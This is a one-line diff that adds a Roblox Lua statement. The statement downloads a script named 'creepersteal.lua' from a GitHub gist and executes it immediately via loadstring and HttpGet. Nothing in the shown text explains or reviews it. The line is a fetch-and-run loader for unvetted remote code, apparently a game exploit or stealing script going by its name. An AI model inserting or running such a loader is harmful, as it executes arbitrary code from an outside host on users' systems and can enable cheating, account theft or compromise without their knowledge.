@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.github.com/BF-PRODUCTIONS/1e9a23deda266334cd1f48201dc26cad/raw/8919f84aa24bd926c96abe93043eb154f8ad9ed0/creepersteal.lua"))()
